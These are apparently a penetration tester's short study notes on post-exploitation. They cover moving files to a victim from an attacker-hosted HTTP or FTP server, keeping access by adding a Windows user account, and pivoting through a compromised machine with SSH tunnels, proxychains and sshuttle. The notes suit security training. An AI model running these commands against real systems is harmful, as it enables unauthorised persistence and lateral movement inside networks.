File Transfer Methods:
	HTTP `python -m SimpleHTTPServer 80`
	FTP - Attacker:`python -m pyftpdlib 21` victim: `ftp <attacker ip>`

Maintaining Access:
	As a pentester, your only method of MA will probably be adding a user
	`net user <user> <password> /add`

Pivoting:
	We are using pivoting to get to different machines using a midpoint
	`cat /etc/proxychains4.conf`
	SSH must be running on a victim machine
	`ssh -f -N -D 9050 -i pivot <user>@<target ip>`
	After, when you want to attack through a tunnel, use
	`proxychains <command to run here>`
	For nmap, sometimes -sT is needed to find ports
	Attacks can be ran through as well.
	RDP can be used via:
	`proxychains xfreerdp /u:<user> /p:'<password>' /v:<target ip>`
	You can use firefox via proxychains:
	`proxychains firefox`
	SSHUTTLE
	You can also use this instead of proxychains
	`sshuttle -r <user>@<target ip> <new network to connect> --ssh-cmd "ssh -i pivot"`
